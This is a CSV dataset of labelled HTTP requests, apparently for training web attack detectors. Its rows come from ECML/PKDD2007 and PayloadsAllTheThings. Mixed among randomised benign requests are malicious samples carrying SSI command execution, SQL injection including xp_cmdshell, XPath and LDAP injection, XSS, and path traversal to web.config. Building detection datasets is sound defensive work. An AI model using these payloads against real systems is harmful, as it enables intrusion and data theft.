attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
,hard,-2.0,benign,"GET /tAo9vOKcjG/aBcqtujp/vwo5nlamHntsiosvo/VjMEYPLxcJr/odi1nmto7iysmhie/oF.c_u@mK79IkXDo/eepaSzr/ko3eye7eeorratt.shtml?Ju_tBtb=19&lmo=tCY_NJ6&dhsmu=snrg8te&ndtESoyemr=s&nrmlohzulTs=g%5C&hrl8mbh3hZt=seLbg HTTP/1.1
Host: 70.58.13.72
Connection: keep-alive
Accept: audio/basic;q=0.6, text/plain;q=0.3
Accept-Charset: *;q=0.2
Accept-Encoding: *;q=0.2
Accept-Language: *;q=0.3
Cache-Control: min-fresh=81
Client-ip: 199.95.124.13
Cookie: sisvi9Uape5=rZX-dmnOV9;9cyae=oXwdmseitahosclZy;I6flike=ibAlnm4rLS;ga=i@etsock_stream
Cookie2: $Version=""243""
Date: Wed, 09 Jul 08 07:57:40 GMT
ETag: W/""lOOiGyG8HGcYRzud""
Expect: raar
From: mohdrcal@8y7xh.de
If-Modified-Since: Sat, 27 Nov 04 10:41:51 UTC
If-Unmodified-Since: Sat, 20 Dec 08 15:05:15 CET
If-Match: ""0cTIu_SDO4XOANDEr""
If-None-Match: ""9Q_oQ.BeU@XE.dv""
If-Range: *
Max-Forwards: 82
MIME-Version: 6.8
Pragma: f='wi8qw'
Proxy-Authorization: Basic dU9vZGF4bGg6ZE9nc3I=
Authorization: Basic dXBvcmRuOmFzU2xhZA==
Range: 13113-277,3-670,8449-3
Referer: /oteeeo6m.gz
TE: trailers
Trailer: TE
User-Agent: riel4fs/1.5.2.5.7
UA-CPU: PowerPC
UA-Disp: 4066,570,8
UA-OS: Linux
UA-Color: color8
UA-Pixels: 170x2008
Via: HTTP/8.7 124.70.161.17:6975
Transfer-Encoding: deflate
Upgrade: Een/6.5, oelp/1.9, pepbl/8.4, hcTat/2.7, Uihj/0.1
Warning: 101 www.lSyoa.html ""se09rYrre6"" 
X-Forwarded-For: 109.176.189.188
X-Serial-Number: 340706
----: -----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~",10582,1455,xml_test-10582,ECML/PKDD2007,
XPath Injection,medium,4.5,malicious,"POST /Txq5a@EM7/AhaibrhtnfeG/ai5rs3doaimtc/oOXRs8Lq/sH3c5gR_HPThmOrVlc/etoob4eidun/Otiwh8t4osetateoMrt.jsp? HTTP/1.0
Content-Length: 7
Content-Language: e
Content-Encoding: gzip
Content-Location: http://tadhdrrs.fr/1Iod2iyn/dscohs/u2Irpen.mp3
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 13 Aug 05 04:29:03 GMT
Host: www.sdec.be
Connection: perhree
Accept: */*;q=0.6
Accept-Charset: x-mac-arabic;q=0.8, iso-8859-1, utf-8;q=0.9, windows-1252
Accept-Encoding: 
Accept-Language: *;q=0.5
Cache-Control: min-fresh=49187
Client-ip: 182.15.172.231
Cookie: Qib.s3Z=346;irsSn0ee=cggeaon']     |   P     |   //user[    name/text() =    'hIat;me=63717812;dtotcnze=267556
Max-Forwards: 1
MIME-Version: 9.4
Referer: /iwam.php
Trailer: Trailer
User-Agent: 7eoOuraDll
Via: 9.0 www.zgLoss.png:631, 3.8 www.tamhr.html:20601
Warning: 020 www.caes.png:4509 ""raEe6"" ""Thu, 13 Oct 05 01:32:31 UTC""

le=onhe",35914,925,xml_test-35914,ECML/PKDD2007,
,hard,-2.0,benign,"GET /nieboethdoatcftasn.nsf? HTTP/1.1
Host: 90.64.34.64
Connection: keep-alive
Accept: video/*
Accept-Charset: *
Accept-Encoding: compress, deflate, deflate;q=0.6, compress
Accept-Language: *;q=0.9
Cache-Control: no-store
Client-ip: 88.130.176.9
Cookie: ditn2mi=956;eohnEfnh=002331
Cookie2: $Version=""66""
Date: Fri, 11 Jan 08 06:19:20 UTC
ETag: ""r6Ok.Mt9kaIy_7c8Hl""
Expect: ttov=si6g
From: oltae@ieknifNr4.org
If-Modified-Since: Thu, 12 Feb 09 10:57:55 GMT
If-Unmodified-Since: Mon, 20 Dec 04 05:53:05 GMT
If-Match: ""nVgCtx.J_L.jsILl_""
If-None-Match: ""8SFeIez_.erBSkIpM9OG""
If-Range: *
Max-Forwards: 20
MIME-Version: 8.6
Pragma: no-cache
Proxy-Authorization: Basic ZmVsenphaWE6M3dydDJx
Authorization: NTLM VWNnNGVjeXJjdE1zUmFXNnQybW9PYW5hcnJ0MGEwY2FvbnRhb3dpZXRjRGFzczZh
Range: 635922-
Referer: /aaoI/emuiae/urlm/reaeere/eHrmrvao.exe
TE: gzip;q=0.4
Trailer: Max-Forwards
User-Agent: Mozilla/6.4 (compatible; MSIE 9.0; SunOS sun4u; oqitn0un)
UA-CPU: PowerPC
UA-Disp: 121,346,8
UA-OS: Windows 98
UA-Color: color16
UA-Pixels: 846x8936
Via: 6.1 49.229.65.14, 4.8 35.164.172.128, 7.6 www.ftscx.css
Transfer-Encoding: frrkht; ansua=ito6a
Upgrade: nA2o/3.8, dn7sz/2.0, oTeya/7.1
Warning: 562 www.72rhlemd.png ""OanfqmoOtceaolig"" 
X-Forwarded-For: 113.16.19.192
X-Serial-Number: 81431781
----: ------------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",16197,1433,xml_test-16197,ECML/PKDD2007,
,hard,-2.0,benign,"GET /tgM5tHd0tx0ni2o/uoX3eD/r.03xsMtR.iN.nsf?vru8hai6iSui0=ecianrehuaanfto7d9&emn4bmaungb=m-I&tsehOm=n%3E%2Fe7&t5hrnot=%7C-b%27system%2Bssformscriptxtermmail%3De&PbQallbkN=ausBz6 HTTP/1.0
Host: 243.34.129.53
Connection: ltalhl8
Accept: application/*, text/html;q=0.7, audio/*
Accept-Charset: windows-1251;q=0.6
Accept-Encoding: 
Accept-Language: emr-tseyaio;q=0.3, uena-psn;q=0.0, meiaA-Ne, t-addbyetn;q=0.6, hceb-aec
Cache-Control: no-transform
Client-ip: 178.54.145.217
Cookie: rnsi0zedsyMe=71;ahb=lQf1V;0processing-instruction4HuU=ahXsrOwnc;sAsjorhli=hainuo;eMtt1nbajsl4zho=I
Cookie2: $Version=""874""
Date: Mon, 29 Aug 05 17:40:47 GMT
ETag: W/""dZdeLIIail_Zlt0UZ""
Expect: SrRtriaD
From: Dt21hm@sbe22sjbhs.com
If-Modified-Since: Sun, 27 Sep 09 02:42:37 UTC
If-Unmodified-Since: Thu, 14 Jun 07 07:06:31 GMT
If-Match: ""o..zbaSPInGvSN7Mc1""
If-None-Match: *
If-Range: ""BQVQ9RC8_vK1rw1oIKh""
Max-Forwards: 6890
MIME-Version: 6.6
Pragma: no-cache
Proxy-Authorization: NTLM dG1ucmlod2lyY3R0dHlvaGtldG5oc2xzdWRoN1h4bmV5Tm9laGVpZGdk
Authorization: Digest username=""4arjfzEs""
Range: 392-,66898-,-0761
Referer: http://www.mcdfekr.com/egigdLsn/bahot6/fOHeje.js
TE: trailers
Trailer: Upgrade
User-Agent: 1reihQa7tetw
UA-CPU: 68000
UA-Disp: 4717,242,16
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 6912x6352
Via: 9.5 57.13.234.143, 2.4 www.iat2o.gif:9435, HTTP/9.4 www.liea.jpg
Transfer-Encoding: gzip
Upgrade: r3yltn/4.8
Warning: 238 180.27.15.55 ""t7r8dlbisjtoofgu"" ""Tue, 07 Feb 06 13:03:45 CET""
X-Forwarded-For: 243.253.89.231
X-Serial-Number: 75164077038098175
----: -----------------
~~~~~: ~~~~~~~~~~",27286,1632,xml_test-27286,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /rlo7peeomrioo8zhIse/estaaehfoym3ei/tGD93mGm6ptv4.mspx?iNa0athtibfg=ee%7E%3Ernntes&dwnXIaRpU6j=tGU5F1w_u&YUJMzQx0k-home=8279&snedd=ehIwb0Dr0s0&dmksib=3972486&nrdtrshsesco=ntiji9trnt6pauhae HTTP/1.1
Host: www.tuo4r.biz:29812
Connection: elzxlh9f
Accept: video/mpeg
Accept-Charset: iso-8859-9;q=0.4, cp-950, windows-1250, koi8
Accept-Encoding: OR  4316=4316
Accept-Language: *
Cache-Control: max-age=689
Client-ip: 156.64.250.125
Cookie: csy4Dr=oTeaZan;Xejresuit=ore
Cookie2: $Version=""05""
Date: Sun, 13 May 07 11:23:16 UTC
ETag: W/""S9Z8LZskFpYVZo2x""
Expect: 100-continue
From: YipHgse@Wh0aus.de
If-Modified-Since: Fri, 01 Oct 04 11:42:27 UTC
If-Unmodified-Since: Fri, 21 Jul 06 19:29:02 UTC
If-Match: ""dDkviAB7vacA@7Np""
If-None-Match: ""9ot@EsXAGipBvI@F""
If-Range: Sun, 18 Sep 05 13:04:04 CET
Max-Forwards: 3
MIME-Version: 4.7
Pragma: d='Ioemim'
Proxy-Authorization: Digest nc=Bba58bDA
Authorization: Basic cnNhRW5uZWQ6ZGg4ZA==
Range: 377941-4452
Referer: http://dsinId.gov/sedsfc/lztoHe.wav
TE: trailers,trailers,chunked;q=0.4
Trailer: Warning
User-Agent: Mozilla/5.8 (Machintosh; U; PPC Mac OS X 2.6; a0-7n; rv:8.5.0) Gecko/56854701
UA-CPU: 68000
UA-Disp: 9585,9750,32
UA-OS: Linux
UA-Color: color8
UA-Pixels: 921x845
Via: huna0/1.7 182.191.133.226
Transfer-Encoding: deflate
Upgrade: tno/0.7, leolp/4.5, ixwe/8.3
Warning: 735 149.242.13.102:8 ""sooeIuiaiic2aizp"" 
X-Forwarded-For: 119.121.155.105
X-Serial-Number: 48880057053
----: ---------------------------
~~~~~: ~~~~~~~~~~~~~~",41250,1527,xml_test-41250,ECML/PKDD2007,
SSI,medium,,malicious,"POST /profile HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Connection: close

search=<!--#exec cmd=""whoami"" -->&id=1704",,196,patt-ssi-0704,PayloadsAllTheThings,"<!--#exec cmd=""whoami"" -->"
SQLi,medium,3.0,malicious,"GET /OJB-3-etco@IhtpassT8r.gif?evaleTshutdownnRFja=me&xpnkroiaMrp=%27UNIONALLSELECTfieldFROMveatesWHERE%27%27+%3D+++%27&lsliagp=lanin2ciurftaiera&idsefjemnnc=919877&sra3timnbrip=jh3n&lHca1b2h=nrli&ndogx9cEedthI=al-0&mithdsahxnooS=sconnectbutyarm3passwde0Ti+%3Fa&udwDdw5=72076784&hnejhmdNtbR=d0darkoreuPlgra5p%29style HTTP/1.0
Host: 49.52.124.13:5
Connection: iboaJosL
Accept: audio/basic;q=0.0, application/x-tar;q=0.0, audio/basic;q=0.5
Accept-Charset: iso-2022-jp;q=0.4, koi8, gb2312;q=0.6
Accept-Encoding: identity, identity, identity
Accept-Language: *;q=0.2
Cache-Control: max-age=8022
Client-ip: 66.228.253.107
Cookie: npdn=rlbn;htosr2niP=073824882;poeza=> ib;Fb=8;YCfromwDzOS8nw=Se
Cookie2: $Version=""7""
Date: Sat, 28 Nov 09 08:36:29 CET
ETag: W/""sEO6-Hh4WcNew12P""
Expect: jao4e=iser
From: wIdO@lerc.gov
If-Modified-Since: Sat, 06 Sep 08 10:56:55 UTC
If-Unmodified-Since: Thu, 05 Jul 07 20:59:01 GMT
If-Match: ""uksNWcbA@zsg4cd""
If-None-Match: ""s3oQO.K0pDBrHcoMoKeU""
If-Range: Fri, 13 Jan 06 18:15:16 GMT
Max-Forwards: 220
MIME-Version: 5.5
Pragma: no-cache
Proxy-Authorization: berie 8peinf=aesruuT
Authorization: NTLM NG1lc29vaHRGd3F0ZWxzZWc5YnJlY3NhaWlvMmpuaDlzbGVlYm1uRWU0bnlt
Range: -0842
Referer: /cKefi/orbT/esedotc.gif
TE: trailers
Trailer: Max-Forwards
User-Agent: Mozilla/3.5 (compatible; MSIE 2.1; Open BSD i586; ibz0qR9sri)
UA-CPU: StrongARM
UA-Disp: 0572,127,8
UA-OS: Solaris
UA-Color: color16
UA-Pixels: 5914x483
Via: HTTP/1.6 www.o2o2rtes.gif, 0.4 61.159.11.145
Transfer-Encoding: identity
Upgrade: hcsrst/2.9, leHto/5.0, t6B/6.8, iheSt/9.4
Warning: 186 127.58.150.59 ""ns2cjsi"" ""Mon, 05 May 08 16:07:50 GMT""
X-Forwarded-For: 206.140.252.134
X-Serial-Number: 431124702375
----: ----------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",41828,1825,xml_test-41828,ECML/PKDD2007,
SQLi,medium,2.0,malicious,"GET /Algal7ils/access_log0kfiakMxtermp5/auaeacont9i/U-p-xJaktQJ/ozPTNtxlqx5D08/idiht/logg/s4tiaeazreooenm/re9lab/1eHtm/is0vnol/BmefiehdiAjtc6.exe?enMtctht=%27%3BEXEC+master.dbo.xp_cmdshell+++++%27cmd.exe&ntarbprunf96ntm=37A&uisrbEbs=nsTAfcxHif HTTP/1.0
Host: www.eXeiioenee.com
Connection: close
Accept: */*
Accept-Charset: windows-1252, windows-1254, cp-936, windows-1253;q=0.0
Accept-Encoding: 
Accept-Language: kaaxtfei-2o, 0-q;q=0.5
Cache-Control: max-stale=64
Client-ip: 70.74.68.114
Cookie: -StjRnAXMglL=4976008343;ottesegzt=288487;bformHHgbFwNIRbetween=location0&
Date: Tue, 03 Oct 06 01:29:17 GMT
ETag: W/""0@NBRWxhqqgere4xA""
If-Modified-Since: Mon, 18 Apr 05 23:26:23 CET
If-Unmodified-Since: Fri, 02 Feb 07 01:03:20 UTC
If-Match: ""pqyLo..u@gR_YOMkbEjm""
If-None-Match: ""FTM9O3AVyJKps7G""
If-Range: *
Max-Forwards: 124
Referer: http://eUhSitn.com/7vlYa/ebtn.asmx
TE: gzip
User-Agent: 5tRyurnEces7utetn
UA-CPU: PowerPC
UA-Color: color8
Transfer-Encoding: gzip",35036,987,xml_test-35036,ECML/PKDD2007,
SSI,medium,,malicious,"GET /search?redirect=<!--#include file=""..\..\web.config"" --> HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Accept: */*
Connection: close",,144,patt-ssi-0585,PayloadsAllTheThings,"<!--#include file=""..\..\web.config"" -->"
,hard,-2.0,benign,"GET /h12jzPrmDjstdine/loeHafgedhoito.htm?o1HusbnegcAe1=lF4&sdoydIa7uis=4378064&sDtzae2pltone=satoDs5jle3tluT&5Q8u2=8366075&treof=9812857 HTTP/1.0
Host: www.rIut.com:90
Connection: close
Accept: image/jpeg
Accept-Charset: *
Accept-Encoding: *
Accept-Language: ueky9omi-td8asre, qn2murtt-sWiei, to2-y8hhrigw, x-bosF;q=0.3, icr-cr2l
Cache-Control: tucl=i1
Client-ip: 210.226.84.255
Cookie: Rieylohsu4i=6907;ce4hwuhinpEtkZ=02309;8hrzit=nkjHEZHZk;lanRev=EProO80
Cookie2: $Version=""84""
Date: Mon, 20 Sep 04 13:01:27 CET
ETag: ""a2YDbXVj7A6.vSq80bLA""
Expect: N1nheiin
From: q8nm@dnhqn.uk
If-Modified-Since: Thu, 29 Nov 07 08:19:42 CET
If-Unmodified-Since: Tue, 11 Mar 08 18:17:22 CET
If-Match: ""5QSDPGib24bVjH@cupf9""
If-None-Match: ""U5sGFzOb-gf9.DB58eAs""
If-Range: *
Max-Forwards: 5
MIME-Version: 7.6
Pragma: no-cache
Proxy-Authorization: NTLM b2FvempTSWhuOWVtcWlvaXU4dGszaXVpbGVpaXJwZUFtaGkzYWxhdHN0UmVuRg==
Authorization: Basic aG5pc2VTMzpsMW4wMHM=
Range: 0-6218,62-,-50681
Referer: /9ls3ls/nhfde/ncrre/iree7.jpeg
TE: trailers
Trailer: If-Match
User-Agent: Mozilla/0.6 (Machintosh; U; PPC Mac OS X 8.0; bu-sN; rv:0.3.2) Gecko/08903292
UA-CPU: StrongARM
UA-Disp: 521,2538,16
UA-OS: Win98
UA-Color: color32
UA-Pixels: 352x2255
Via: FTP/7.1 www.eeeaA.htm:7749
Transfer-Encoding: gzip
Upgrade: aTrdtn/5.5, drrU/7.9, dWr/1.4
Warning: 807 www.ndncvohd.html ""snOcrN"" 
X-Forwarded-For: 83.53.98.240
X-Serial-Number: 0947873125180577061
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~",19348,1519,xml_test-19348,ECML/PKDD2007,
XSS,medium,,malicious,"POST /auth HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close

file=""`'><script>\x21javascript:alert(1)</script>&id=2239",,215,patt-xss-1239,PayloadsAllTheThings,"""`'><script>\x21javascript:alert(1)</script>"
LDAP Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Connection: close

search=Can be used in an injection like `*)(ATTRIBUTE_HERE=*&id=1163",,230,patt-ldap-injection-0163,PayloadsAllTheThings,Can be used in an injection like `*)(ATTRIBUTE_HERE=*
Path Traversal,medium,,malicious,"POST /api/items HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Connection: close

redirect=..\\..\\..\\..\\..\\..\\..\\..\\{FILE}&id=2122",,214,patt-path-traversal-1122,PayloadsAllTheThings,..\\..\\..\\..\\..\\..\\..\\..\\{FILE}
,hard,-2.0,benign,"GET /StianNaeaindaoeqtAa/iinte7tsdaprh/elenstochaeofeenn/mmocha5H/tA/azq/i.CuTSFg_/e_AIb/t5OVKjH/wh/sVYYlv6gExh/Z5.php?cErhzrNchas=gst&dvtEgcml3iodbt=s3.n-&2fOASA-RL=cud%29ecmdEtEhhaving HTTP/1.0
Host: www.tmdihs.cz
Connection: ootiai9t
Accept: text/*, application/*;q=0.2
Accept-Charset: *;q=0.4
Accept-Encoding: 
Accept-Language: Hk1r8rg-0Er, of-ct2v
Cache-Control: no-transform
Client-ip: 242.209.113.208
Cookie: autoexecsor1Z=177;rdade=in]iEateq=nN$c t;ismnlNhunb6yae=HteH;cir7sFtjnnlfhu=~i[escripth5[ mni;shsereiYylaKn=dhn
Cookie2: $Version=""808""
Date: Fri, 31 Jul 09 23:58:04 CET
ETag: ""SmAzF.gyYce_XQcLq""
Expect: 100-continue
From: 6fkd@u3ghin.st
If-Modified-Since: Tue, 17 Feb 04 04:03:01 UTC
If-Unmodified-Since: Sat, 01 Sep 07 12:18:18 GMT
If-Match: ""8zEZiswhZfe1X4MT""
If-None-Match: *
If-Range: *
Max-Forwards: 5
MIME-Version: 0.4
Pragma: no-cache
Proxy-Authorization: sRah gaho=eeosctBp
Authorization: Basic dWFuZWkyeGk6c2FudGo=
Range: -25838,-884476
Referer: http://www.slitelee.de/ScRl/s7Mittd/tqja/lspuefl/3iuriey.gif
TE: chunked
Trailer: Date
User-Agent: deojeeoatw/0.7
UA-CPU: 68000
UA-Disp: 491,773,32
UA-OS: Windows NT
UA-Color: color32
UA-Pixels: 3710x9582
Via: 1.9 www.trir10cu.jpg, FTP/9.6 68.29.93.65
Transfer-Encoding: gzip
Upgrade: doTsa/2.7, brr8a/3.0
Warning: 146 111.229.123.201:35 ""bbrhnev4atnhijdy"" ""Sat, 11 Dec 04 20:32:24 GMT""
X-Forwarded-For: 240.52.92.34
X-Serial-Number: 999844116491308
----: ------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~",20629,1521,xml_test-20629,ECML/PKDD2007,
,hard,-2.0,benign,"PUT /7UpF5H-9gh8b9Sz/ny_CO6XaOwnsNQhHkR/eT3A0PCk1UI5TPQq3c9Q/J7rfIoqselectYgVnIb/eSa6.nsf? HTTP/1.1
Content-Length: 43
Content-Language: sxrd8,7t5uye,negrf
Content-Encoding: compress
Content-Location: /Ehgn.swf
Content-MD5: OG83c2thcnR0cnhhaW5BTQ==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 19 Jun 07 02:58:23 GMT
Last-Modified: Thu, 10 Jan 08 17:31:25 CET
Host: 185.107.122.165
Connection: close
Accept: text/*;q=0.9, audio/x-wav
Accept-Charset: iso-8859-1
Accept-Encoding: 
Accept-Language: *;q=0.7
Cache-Control: no-store
Client-ip: 18.53.58.226
Cookie: 8aairi=dbwx3w4;THS@wGRUX=13;lkmpna8la5ee9an=5048;ei3=Muon elogerm;ngqereetaoitxhs=x7sipassthruD=8m1sxterm1Usts
Cookie2: $Version=""02""
Date: Sat, 12 Apr 08 08:37:00 GMT
ETag: W/""x.1@yW8wIjiCNMwf""
Expect: 100-continue
From: sxtr@edeti.de
If-Modified-Since: Tue, 05 Feb 08 19:59:05 UTC
If-Unmodified-Since: Sun, 15 Feb 04 13:33:34 UTC
If-Match: ""mburRMODMTYB12UKNi""
If-None-Match: *
If-Range: Wed, 04 Jul 07 11:42:42 CET
Max-Forwards: 2
MIME-Version: 6.0
Pragma: no-cache
Proxy-Authorization: NTLM Njllcmh0bmxBbnF0T2RhZWh3anVydGRzM25lZG9zZzZ1U3R0UGVqTm8=
Authorization: hoiei aXug1re=ifch
Range: 4904-,9435-,312-
Referer: http://oheided.uk/4le6t/tewr.avi
TE: trailers,trailers,chunked
Trailer: Transfer-Encoding
User-Agent: rnDvos/8.1.4
UA-CPU: 68000
UA-Disp: 068,389,8
UA-OS: FreeBSD
UA-Color: color16
UA-Pixels: 1302x7380
Via: FTP/9.1 234.146.152.32, FTP/9.5 www.xtgAib.htm
Transfer-Encoding: compress
Upgrade: 5a1o/5.9, umu/3.5
Warning: 203 227.12.172.4 ""glfymariontdS0eiet"" ""Sat, 14 May 05 05:37:02 GMT""
X-Forwarded-For: 109.33.9.119
X-Serial-Number: 0347000130099147
----: ------------------
~~~~~: ~~~~~~~~~~~~

oN6Iartsltond=f0eety;48&chaaohrgytaow=m3x",7335,1785,xml_test-7335,ECML/PKDD2007,
,hard,-2.0,benign,"GET /xVKIe@t2dIkxza/i27VVnZCPdytmX/VTandeB_X_o/3u/Ulsgi_LN/3Gc.html?e8hsta=039937&GOP1Z%uq.VIDform=hWKom1Cg-uq HTTP/1.0
Host: 154.235.201.64
Connection: close
Accept: */*;q=0.5
Accept-Charset: *
Accept-Encoding: 
Accept-Language: ri-stlIEtS
Cache-Control: max-age=3
Client-ip: 97.216.142.149
Cookie: DkorTvduetsdsm=eo;aistNnpTheo=aoz0Hoglocation noe;n3et=3us m;tuopAvT=hiform
Cookie2: $Version=""965""
Date: Tue, 03 Jul 07 17:55:44 GMT
ETag: W/""AUAbhpcHv6fysclWU9kw""
Expect: ycestrfr
From: O35r@NAzet.cz
If-Modified-Since: Fri, 08 Sep 06 09:19:35 UTC
If-Unmodified-Since: Mon, 19 Sep 05 04:47:29 GMT
If-Match: *
If-None-Match: *
If-Range: Mon, 13 Oct 08 03:32:15 UTC
Max-Forwards: 4838
MIME-Version: 5.0
Pragma: no-cache
Proxy-Authorization: Basic c25lbDppZWRlbQ==
Authorization: Basic dG5pb2NobG46a0V0ZA==
Range: 7-19547,727449-
Referer: http://www.ardz.ch/gzOmshBi/RcjLa/s2aLwsii/szzSl.zip
TE: chunked;q=0.2,trailers,trailers
Trailer: If-Range
User-Agent: t6mpru/7.7.3
UA-CPU: MIPS
UA-Disp: 5927,611,32
UA-OS: Solaris
UA-Color: color16
UA-Pixels: 1031x1153
Via: 5.4 www.iHqlikEd.htm
Transfer-Encoding: gzip
Upgrade: spiie/8.9, apg2sc/2.7, exuI/4.7, ndd/9.7, fnvse/6.9
Warning: 364 www.n0ehr.css:691 ""oEieijPwonreuaI"" ""Thu, 15 May 08 10:24:17 UTC""
X-Forwarded-For: 61.167.250.228
X-Serial-Number: 7053586525400090779
----: -------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~",30907,1427,xml_test-30907,ECML/PKDD2007,
SQLi,medium,3.0,malicious,"GET /k6YV2iGAN@gcL6iO3/dtmfGSsettyeleOaSl/sduooeiyo68tcsxcs/9.2kQ@M945fIdn3GsX-/pAahwihnr/z@dPL/hx_tqes2tGNpZ/ndiar.html?ns4eot3edtnxnee=EltEpatn&ceqashero=7657134&jtF=aeiygloais&encC1Z6=i84AmorisT&ldThsHlmel=gsirtg&eoene=OrigText%27OR%27idnSnt%27++++%3D++%27jMi%27&1enyqoilo=arlEeetsl&9ll=document0tdoqGEicet6&rssae=131&qenoutmwace0x=66497735&ds3iugssod1a0ii=7ba&oktvhaeil=%7C&xZPo=%2Bcatnlsei%40susw+xp_&hYT7TXB=npuRn0emp HTTP/1.0
Host: www.i9irhln.com
Connection: 6qaa
Accept: image/jpeg;q=0.7
Accept-Charset: hz-gb-2312;q=0.5, euc-jp
Accept-Encoding: 
Accept-Language: *;q=0.6
Cache-Control: no-cache
Client-ip: 234.69.56.127
Cookie: likeuM8D=9250156;8tirCslhofs=qtiWeie4(;ttypo=140058;pDirveiwgans=r-B-8Kv9tN;sGrf=ih(mnt5|il8fetcs0siAo
Cookie2: $Version=""054""
Date: Wed, 11 Apr 07 03:40:02 CET
ETag: W/""W3Dl8Wik9y5E8q13ewRG""
Expect: 100-continue
From: DiEa@y1ebyi.uk
If-Modified-Since: Sun, 12 Jul 09 03:08:24 CET
If-Unmodified-Since: Tue, 07 Sep 04 09:19:21 CET
If-Match: *
If-None-Match: ""4dzFvPJ7-3442tcmPWv""
If-Range: Wed, 09 Jul 08 24:27:17 UTC
Max-Forwards: 5345
MIME-Version: 5.2
Pragma: no-cache
Proxy-Authorization: nrRny etsaey=elewdabt
Authorization: baldw 1aneseaa=tt40ou
Range: -42018,-510767
Referer: http://wa5mQn.be/uaGeedc/tuEta.dll
TE: gzip;q=0.6
Trailer: Proxy-Authorization
User-Agent: nwohaIsid (h9F46uPIgQ; ejaOjjwRF)
UA-CPU: x86
UA-Disp: 695,8049,32
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 999x243
Via: 6.0 212.102.218.17:00182, 6.6 www.ttrhhrn.jpg, HTTP/6.2 www.aoasi.jpg
Transfer-Encoding: deflate
Upgrade: eEtha/8.4
Warning: 478 44.68.67.163:8 ""haHdehmpgh"" 
X-Forwarded-For: 171.143.1.2
X-Serial-Number: 51653386435804651
----: ----------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",42343,1798,xml_test-42343,ECML/PKDD2007,
XSS,medium,,malicious,"POST /download HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Connection: close

username=e.g: 14.rs/#alert(document.domain)&id=2245",,212,patt-xss-1245,PayloadsAllTheThings,e.g: 14.rs/#alert(document.domain)
